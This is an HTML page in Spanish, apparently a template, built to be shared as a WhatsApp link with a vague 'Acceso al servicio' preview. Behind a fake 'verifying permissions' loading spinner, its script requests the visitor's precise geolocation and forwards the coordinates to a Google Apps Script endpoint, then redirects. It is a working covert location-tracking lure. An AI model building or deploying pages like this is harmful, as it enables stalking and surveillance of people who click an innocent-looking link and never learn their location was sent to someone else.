<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando...</title>

  <!-- Metadatos para WhatsApp y redes sociales (Open Graph) -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="Acceso al servicio">
  <meta property="og:description" content="Haz clic para continuar">
  <!-- IMPORTANTE: Usa la URL directa y pública (raw) de tu imagen 'luna' en GitHub -->
  <!-- Ejemplo: https://raw.githubusercontent.com/TU_USUARIO/TU_REPOSITORIO/main/luna.jpg -->
  <meta property="og:image" content="https://raw.githubusercontent.com/TU_USUARIO/TU_REPOSITORIO/main/luna.png">
  <meta property="og:image:width" content="600">
  <meta property="og:image:height" content="315">

  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f8f9fa;
      color: #333;
      text-align: center;
      padding: 20px;
    }
    .spinner {
      border: 4px solid #e0e0e0;
      border-top: 4px solid #007bff;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    p {
      font-size: 1.1rem;
    }
  </style>
</head>
<body>

  <div class="spinner"></div>
  <p>Verificando permisos y cargando el sitio...</p>

  <script>
    const destinoBase = "https://script.google.com/macros/s/AKfycbwssa1HAg7fh83S9LTyx92XaJ9OKIInI7elzBFTsogvhFkiuF4BbrgSR-kMCwioIhd1/exec";

    function redirigir(params = "") {
      window.location.href = destinoBase + params;
    }

    // Solicitar ubicación al cargar
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          // Si el usuario acepta, puedes enviar las coordenadas al script vía URL si lo deseas:
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          redirigir(`?lat=${lat}&lon=${lon}`);
        },
        (error) => {
          // Si el usuario rechaza o hay error, se redirige de todas formas
          redirigir();
        },
        {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        }
      );
    } else {
      // Si el navegador no soporta geolocalización
      redirigir();
    }
  </script>

</body>
</html>
